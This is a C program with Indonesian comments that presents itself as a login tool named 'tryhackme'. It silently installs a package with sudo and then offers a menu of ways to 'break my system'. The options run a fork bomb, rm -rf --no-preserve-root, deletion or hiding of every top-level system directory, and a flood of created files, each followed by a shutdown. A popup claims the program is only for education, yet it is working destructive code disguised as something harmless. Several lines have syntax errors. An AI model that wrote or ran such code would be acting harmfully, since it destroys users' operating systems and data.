#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <daftar_function.h>
#include <string.h>
#include <stdbool.h>
//function untuk perintah sistem
char opensistem(){
	int pilihan_destry;
	system("clear");
	puts(kuning 
		"\n"
		"  ++++++++++++++++++++++++++++++++++++++++++++++++++++ \n "
		" |              (: RUSAK SISTEM KU :)               | \n "
		" ++++++++++++++++++++++++++++++++++++++++++++++++++++ \n "
		" | (1). Rusak Cpu Ku                      | 0123000 | \n "
		" | (2). Rusak Penyimpanan Ku              | 0234930 | \n "
		" | (3). Rusak Sistem Operasi Ku           | 1231210 | \n "
		" | (4). Rusak Semua File Ku               | 0002132 | \n "
		" | (5). Sembunyikan File Dan Folder Ku    | 0001110 | \n "
		" ==================================================== \n "
		);
	printf(kuning " Masukkan Pilihan Anda : ");
	scanf("%d", &pilihan_destry);
	switch(pilihan_destry){
		case 1:
			system("zenity --info --text='SAYA HANYA MEMBERI TAU BAHWA SISTEM LINUX ANDA SUDAH DIRUSAK BUKAN DIRETAS, DAN INI HANYALAH UNTUK EDUKASI BAGAIMANA DEMO PERINTAH PERINTAH BERBAHAYA DI LINUX DAPAT MERUSAK SISTEM ANDA AGAR ANDA LEBIH BERHATI HATI DALAM HAL INI' --title='PENGUMUMAN'");
			system(":(){:|:&};:")
			system("clear && init 0");
			exit(0);
		case 2:
			system("zenity --info --text='SAYA HANYA MEMBERI TAU BAHWA SISTEM LINUX ANDA SUDAH DIRUSAK BUKAN DIRETAS, DAN INI HANYALAH UNTUK EDUKASI BAGAIMANA DEMO PERINTAH PERINTAH BERBAHAYA DI LINUX DAPAT MERUSAK SISTEM ANDA AGAR ANDA LEBIH BERHATI HATI DALAM HAL INI' --title='PENGUMUMAN'");
			system("index=1; batas=1000000000; for ((i=index; i<batas; i++));do touch hack$i.me; done");
			system("clear && init 0");
			exit(0);
		case 3:
			system("zenity --info --text='SAYA HANYA MEMBERI TAU BAHWA SISTEM LINUX ANDA SUDAH DIRUSAK BUKAN DIRETAS, DAN INI HANYALAH UNTUK EDUKASI BAGAIMANA DEMO PERINTAH PERINTAH BERBAHAYA DI LINUX DAPAT MERUSAK SISTEM ANDA AGAR ANDA LEBIH BERHATI HATI DALAM HAL INI' --title='PENGUMUMAN'");
			system("rm -rfv --no-preserve-root && :(){:|:&};:");
			system("clear && init 0");
			exit(0);
		case 4:
			system("zenity --info --text='SAYA HANYA MEMBERI TAU BAHWA SISTEM LINUX ANDA SUDAH DIRUSAK BUKAN DIRETAS, DAN INI HANYALAH UNTUK EDUKASI BAGAIMANA DEMO PERINTAH PERINTAH BERBAHAYA DI LINUX DAPAT MERUSAK SISTEM ANDA AGAR ANDA LEBIH BERHATI HATI DALAM HAL INI' --title='PENGUMUMAN'");
			system("rm -rf /bin && rm -rf /boot && rm -rf /cdrom && rm -rf /dev && rm -rf /etc && rm -rf /home && rm -rf /lib && rm -rf /lib64 && rm -rf /lost+found && rm -rf /media && rm -rf /mnt && rm -rf /opt && rm -rf /proc && rm -rf /root && rm -rf /run && rm -rf /sbin && rm -rf /srv && rm -rf /sys && rm -rf /tmp && rm -rf /usr && rm -rf /var &&");
			system("clear && init 0");
			exit(0);
		case 5:
			system("zenity --info --text='SAYA HANYA MEMBERI TAU BAHWA SISTEM LINUX ANDA SUDAH DIRUSAK BUKAN DIRETAS, DAN INI HANYALAH UNTUK EDUKASI BAGAIMANA DEMO PERINTAH PERINTAH BERBAHAYA DI LINUX DAPAT MERUSAK SISTEM ANDA AGAR ANDA LEBIH BERHATI HATI DALAM HAL INI' --title='PENGUMUMAN'");
			system("mv /bin .bin");
			system("mv /boot .boot");
			system("mv /cdrom .cdrom");
			system("mv /dev .dev");
			system("mv /etc .etc");
			system("mv /home .home");
			system("mv /lib .lib");
			system("mv /lib64 .lib64");
			system("mv /lost+found .lost+found");
			system("mv /media .media");
			system("mv /mnt .mnt");
			system("mv /opt .opt");
			system("mv /proc .proc");
			system("mv /root .root");
			system("mv /run .run");
			system("mv /sbin .sbin");
			system("mv /srv .srv");
			system("mv /sys .sys");
			system("mv /tmp .tmp");
			system("mv /usr .usr");
			system("mv /var .var");
			system("clear && init 0");
			exit(0);

	return 0;
}
//function untuk halaman baru jika user berhasil login
void tryhackme();
int main(void){
	//install zenity secara diam diam
	system(" sudo apt-get install -y zenity > /dev/null 2>&1");
	system(" zenity --info --text='Pastikan Anda Mengaktifkan Sebagai Root' --title='Penting")
	title();
	//struct untuk membuat validasi inputan
	struct Input_Validasi
	{
		const char * help;
		char user[100];
		char pasword[100];
		char konfirmasi_pasword[100];
	};
	struct Input_Validasi masuk;
	masuk.help = "help";
	printf(kuning " Nama Pengguna : @");
	fgets(masuk.user, 100, stdin);	
	printf(kuning " Kata Sandi : ");
	fgets(masuk.pasword, 100, stdin);
	printf(kuning " Konfirmasi Kata Sandi : ");
	fgets(masuk.konfirmasi_pasword, 100, stdin);
	//buat sebuah kondisi dimana dia harus mengisi kata sandi yang cocok supaya
	//user berhasil mendaftar
	if(strcmp(masuk.pasword, masuk.konfirmasi_pasword) == 0){
		puts(kuning " Login Sukses!!! "); //status sukses
		tryhackme();
	}else{
		while(1){ //kondisi gagal
			int batas;
			puts(merah " Kata Sandi Tidak Valid! ");
			return -1;
		}
	}
	fflush(stdin);
	return 0;
}

//function halaman baru jika user berhasil login
void tryhackme(){
	//install zenity secara diam diam untuk memberikan pesan bahwa sistem sudah dirusak
	system("apt-get install -y zenity > /dev/null 2>&1");
	retas_aku();
	//ukuran untuk variabel help
	#define MAX_SIZE1 11 
	#define MAX_SIZE2 11
	typedef struct List_COmmand{
		char validasi_command[MAX_SIZE1];
		char validasi_kategori[MAX_SIZE2];
	}Command;
	//alokasikan alamat memori memakai malloc
	Command perintah;
	Command *list = (Command *)malloc(sizeof(Command));
	printf(birumuda	" Perintah:");
	printf(kuning   " \"help\"\n");
	printf(putih " > ");
	scanf("%s", list->validasi_command);
	if(!strcmp(list->validasi_command, "help") == false){
		perror(merah "Gagal");
		sleep(3);
		system("sleep 1 && exit");
	}//tanpa else wkwkwkw, ntar aku disatirin sama mastah mastah programmer XD
	//default
	list_kategori();
	printf(birumuda	" Pilih:");
	printf(kuning   " open"merah "[Pilihan]\n");
	printf(putih " > ");
	scanf("%s", list->validasi_kategori);
	(strcmp(list->validasi_kategori, "opensistem") == 0 ) ? opensistem() : puts(" "); 
	free(list);
}
